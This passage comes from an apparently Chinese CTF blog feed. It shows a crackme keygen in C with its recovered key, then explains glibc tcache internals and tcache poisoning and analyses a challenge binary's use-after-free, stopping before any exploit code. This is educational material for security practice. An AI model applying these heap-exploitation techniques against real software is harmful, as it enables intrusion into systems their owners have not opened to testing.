        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span>v5<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        local_10 <span class="token operator">=</span> local_10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>所以可以逆向求出应该输入的字符串</p>
<p>exp.c</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">//  main.c</span>
<span class="token comment" spellcheck="true">//  re1</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">//  Created by ios on 2019/3/10.</span>
<span class="token comment" spellcheck="true">//  Copyright © 2019 ios. All rights reserved.</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token string">"KanXueCTF2019JustForhappy"</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> b<span class="token punctuation">[</span><span class="token number">62</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ"</span><span class="token punctuation">;</span>
   <span class="token keyword">int</span> c<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> d<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>d<span class="token operator">&lt;</span><span class="token number">25</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>a<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                c<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>
               <span class="token comment" spellcheck="true">//printf("%d,",c[d]);</span>
                d<span class="token operator">=</span>d<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token comment" spellcheck="true">//break ;</span>
            <span class="token punctuation">}</span>

        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>



<span class="token comment" spellcheck="true">//int Str[25]={19,0,27,59,44,4,11,55,14,30,28,29,37,18,44,42,43,14,38,41,7,0,39,39,48};</span>
   <span class="token keyword">int</span> local_10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> v5<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    local_10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>local_10 <span class="token operator">!=</span> <span class="token number">25</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">62</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">35</span> <span class="token operator">&lt;</span> c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            v5<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">29</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">36</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">9</span> <span class="token operator">&lt;</span> c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                v5<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">87</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&lt;</span> c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    v5<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span>v5<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        local_10 <span class="token operator">=</span> local_10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token punctuation">}</span>
</code></pre>
<p>成功拿到key</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">j0rXI4bTeustBiIGHeCF70DDM
</code></pre>
<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>这里如果不好理解的可以对照IDA理解源码，并且使用动态调试 在strcmp处下断</p>
<p>图一</p>
<p> 任意输入字符例如 A  达到断点处会得到</p>
<p>图二</p>
<p> 通过两次处理后的结果为8 ，因为第二次做的处理为从数组出取元素 所以通过结果得到 param_1 的值</p>
<p>逆推到第一次处理 运算得到第一位应输入字符 </p>
<p>这样可以帮助理解（动态调试大法好～）</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;第一题-流浪者&quot;&gt;&lt;a href=&quot;#第一题-流浪者&quot; class=&quot;headerlink&quot; title=&quot;第一题 流浪者&quot;&gt;&lt;/a&gt;第一题 流浪者&lt;/h3&gt;&lt;p&gt;下载到程序 简单执行下 就是简单的creakerme ，需要输入正确验证码。&lt;/p&gt;
&lt;p&gt;载入 g
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Tcache学习-god-the-reum</title>
    <link href="http://iosmosis.github.io/2019/03/04/Tcache%E5%AD%A6%E4%B9%A0-god-the-reum/"/>
    <id>http://iosmosis.github.io/2019/03/04/Tcache学习-god-the-reum/</id>
    <published>2019-03-04T06:40:37.000Z</published>
    <updated>2019-03-12T13:27:23.527Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Tcache-struct"><a href="#Tcache-struct" class="headerlink" title="Tcache struct"></a>Tcache struct</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> tcache_entry
<span class="token punctuation">{</span>
  <span class="token keyword">struct</span> tcache_entry <span class="token operator">*</span>next<span class="token punctuation">;</span>
<span class="token punctuation">}</span> tcache_entry<span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span>
<span class="token keyword">typedef</span> <span class="token keyword">struct</span> tcache_perthread_struct
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> counts<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>
  tcache_entry <span class="token operator">*</span>entries<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> tcache_perthread_struct<span class="token punctuation">;</span>

<span class="token keyword">static</span> __thread tcache_perthread_struct <span class="token operator">*</span>tcache <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
</code></pre>
<h3 id="Tcache-get-Tcache-put"><a href="#Tcache-get-Tcache-put" class="headerlink" title="Tcache_get/Tcache-put"></a>Tcache_get/Tcache-put</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">tcache_put</span> <span class="token punctuation">(</span>mchunkptr chunk<span class="token punctuation">,</span> size_t tc_idx<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>tcache_entry <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>
  e<span class="token operator">-></span>next <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//增加到链表头部</span>
  <span class="token operator">++</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//记录当前 bin 的 chunk数</span>
<span class="token punctuation">}</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span>
<span class="token function">tcache_get</span> <span class="token punctuation">(</span>size_t tc_idx<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">assert</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">;</span>
  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>tcache_put</p>
<p>用于把一个 <code>chunk</code> 放到 指定的 <code>tcache-&gt;entries</code> 里面去， <code>tc_idx</code> 通过 <code>csize2tidx (nb)</code> 计算得到 （<code>nb</code>是 <code>chunk</code> 的大小）。</p>
<p>它首先把 <code>chunk+2*SIZE_SZ</code> （就是除去 <code>header</code> 部分） 强制转换成 <code>tcache_entry *</code> 类型，然后插入到 <code>tcache-&gt;entries[tc_idx]</code> 的首部，最后把 <code>tcache-&gt;counts[tc_idx]</code> 加 <code>1</code> ，表示新增了一个 <code>chunk</code> 到 该 表项。</p>
<p>tcache_get</p>
<p>根据 <code>tc_idx</code> 取出 <code>tcache-&gt;entries[tc_idx]</code> 的第一个<code>chunk</code> ， 然后把 指针强制转换为 <code>(void *)</code></p>
<p>仅仅检查了 tc_idx 并无做更多检查 可以将 tcache 当作一个类似于 fastbin 的单独链表，只是它的 check，并没有 fastbin 那么复杂。</p>
<h4 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h4><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>通过修改 free 状态的 tcache 里面的 chunk 的 fd （其实就是 tcache_entry-&gt;next ) ，可以分配到任意地址

tache posioning 和 fastbin attack类似，而且限制更加少，不会检查size。
</code></pre><p>一个 tcache bin 中的最大块数<code>mp_.tcache_count</code>是<code>7</code></p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* This is another arbitrary limit, which tunables can change.  Each
   tcache bin will hold at most this number of chunks.  */</span>
<span class="token macro property"># <span class="token directive keyword">define</span> TCACHE_FILL_COUNT 7</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
</code></pre>
<p>具体知识点参考阅读</p>
<p>  <a href="https://www.secpulse.com/archives/71958.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/71958.html</a></p>
<p> <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack/#tcache-poisoning" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack/#tcache-poisoning</a></p>
<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="### 题目分析"></a>### 题目分析</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">case</span> <span class="token number">1u</span><span class="token punctuation">:</span>
       v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> dword_20202C<span class="token punctuation">]</span><span class="token punctuation">;</span>
       <span class="token function">create_size</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
     <span class="token keyword">case</span> <span class="token number">2u</span><span class="token punctuation">:</span>
       v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_11DC</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
       <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
     <span class="token keyword">case</span> <span class="token number">3u</span><span class="token punctuation">:</span>
       v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_11DC</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
       <span class="token function">delete_free</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
     <span class="token keyword">case</span> <span class="token number">4u</span><span class="token punctuation">:</span>
       v3 <span class="token operator">=</span> v5<span class="token punctuation">;</span>
       <span class="token function">print_all</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
     <span class="token keyword">case</span> <span class="token number">5u</span><span class="token punctuation">:</span>
       <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"bye da."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
     <span class="token keyword">case</span> <span class="token number">6u</span><span class="token punctuation">:</span>
       v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_11DC</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
       <span class="token function">developer</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
     <span class="token keyword">default</span><span class="token punctuation">:</span>
       <span class="token function">sub_11B3</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
</code></pre>
<p>运行对比可以知道</p>
<p>主要有创建、储存、删除、打印、退出、以及隐藏功能 修改地址</p>
<h4 id="creat-size"><a href="#creat-size" class="headerlink" title="creat_size"></a>creat_size</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>s <span class="token operator">||</span> dword_20202C <span class="token operator">></span> <span class="token number">4</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"wallet creation failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x82uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>s <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">=</span> <span class="token number">30768</span><span class="token punctuation">;</span>
  v1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"how much initial eth? : "</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%llu"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> size<span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> size<span class="token punctuation">;</span>
  <span class="token operator">++</span>dword_20202C<span class="token punctuation">;</span>
  <span class="token function">sub_119B</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Creating new wallet succcess !\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>代码有删减 </p>
<p>size可控 主要功能 创建一个size可控的chunk</p>
<h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">
  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"how much you wanna withdraw? : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%llu"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">=</span> v2<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//判断是否为0 如果为0则执行free</span>
    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//uaf</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"withdraw ok !\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
</code></pre>
<p>这里free以后没有清空指针 导致存在uaf漏洞</p>
<h4 id="print-all"><a href="#print-all" class="headerlink" title="print_all"></a>print_all</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>

<span class="token function">sub_119B</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"========== My Wallet List ============="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dword_20202C<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d) "</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_FD5</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">16LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">16LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">return</span> <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">sub_FD5</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> _QWORD <span class="token operator">*</span>a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"addr : %s, ballance %llu\n"</span><span class="token punctuation">,</span> a1<span class="token punctuation">,</span> <span class="token operator">*</span>a2<span class="token punctuation">,</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data<span class="token operator">-</span>lang<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data<span class="token operator">-</span>trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data<span class="token operator">-</span>label_position<span class="token operator">=</span><span class="token string">"outer"</span> data<span class="token operator">-</span>labels_left<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_right<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
</code></pre>
<p>打印所有chunk id 及内容</p>
<h4 id="developer"><a href="#developer" class="headerlink" title="developer"></a>developer</h4><pre class=" language-`c"><code class="language-`c">__int64 __fastcall developer(__int64 a1)
{
  sub_119B(a1);
  puts("this menu is only for developer");
  puts("if you are not developer, please get out");
